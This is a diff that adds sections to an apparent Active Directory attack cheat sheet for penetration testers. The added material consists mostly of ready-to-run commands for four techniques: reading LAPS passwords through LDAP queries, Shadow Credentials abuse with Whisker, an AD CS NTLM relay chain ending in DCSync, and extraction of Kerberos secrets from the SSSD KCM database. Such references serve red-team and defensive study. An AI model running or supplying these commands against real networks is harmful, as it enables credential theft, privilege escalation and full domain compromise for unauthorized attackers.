@@ -45,6 +45,7 @@
     - [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
     - [Kerberoasting](#kerberoasting)
     - [KRB_AS_REP Roasting](#krbasrep-roasting)
+    - [Shadow Credentials](#shadow-credentials)
     - [Pass-the-Hash](#pass-the-hash)
     - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
       - [Using impacket](#using-impacket)
@@ -56,6 +57,7 @@
       - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
+      - [AD CS Relay Attack](#ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
@@ -85,6 +87,7 @@
   - [Linux Active Directory](#linux-active-directory)
     - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
     - [CCACHE ticket reuse from keyring](#ccache-ticket-reuse-from-keyring)
+    - [CCACHE ticket reuse from SSSD KCM](#ccache-ticket-reuse-from-sssd-kcm)
     - [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
     - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
   - [References](#references)
@@ -1087,6 +1090,12 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
 
 > The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
 
+* adsisearcher (native binary on Windows 8+)
+    ```powershell
+    ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
+    ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))").findAll() | ForEach-Object { $_.properties}
+    ```
+
 * CrackMapExec
     ```powershell
     crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
@@ -1354,6 +1363,30 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 **Mitigations**: 
 * All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 
+
+### Shadow Credentials
+
+Requirements :
+* Domain Controller on Windows Server 2016
+* PKINIT Kerberos authentication
+* An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object
+
+Add **Key Credentials** to the attribute **msDS-KeyCredentialLink** of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
+
+```powershell
+# https://github.com/eladshamir/Whisker
+
+Whisker.exe list /target:computername$
+# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+
+Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
+# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+
+Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
+# Removes a key credential from the target object specified by a DeviceID GUID.
+```
+
+
 ### Pass-the-Hash
 
 The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
@@ -1585,6 +1618,29 @@ Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impack
 ```powershell
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
+
+
+#### AD CS Relay Attack
+
+https://github.com/SecureAuthCorp/impacket/pull/1101
+
+1. Run the ntlmrelayx.py and set your Certificate Authority (CA) as a target
+    ```powershell
+    python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
+    python3 ntlmrelayx.py -t http://cs1.lab.local/certsrv/certfnsh.asp -smb2support --adcs
+    ```
+2. Exploit the print spooler bug
+    ```powershell
+    python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
+    python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
+    ```
+3. Request the TGT using the certificate
+    ```powershell
+    Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
+    Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzCC...<snip>...NfrHtUUXS /ptt
+    ```
+4. Now you can DCSync with the DC machine account
+
 
 ### Dangerous Built-in Groups Usage
 
@@ -2448,6 +2504,22 @@ Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/Tar
 [X] [uid:0] Error retrieving tickets
 ```
 
+### CCACHE ticket reuse from SSSD KCM
+
+SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
+The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. 
+By default, the key is only readable if you have **root** permissions.
+
+Invoking `SSSDKCMExtractor` with the --database and --key parameters will parse the database and decrypt the secrets.
+
+```powershell
+git clone https://github.com/fireeye/SSSDKCMExtractor
+python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
+```
+
+The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.
+
+
 ### CCACHE ticket reuse from keytab
 
 ```powershell
@@ -2577,3 +2649,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
 * [Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 * [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
+* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
+* [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
+* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab#Previous%20Work)
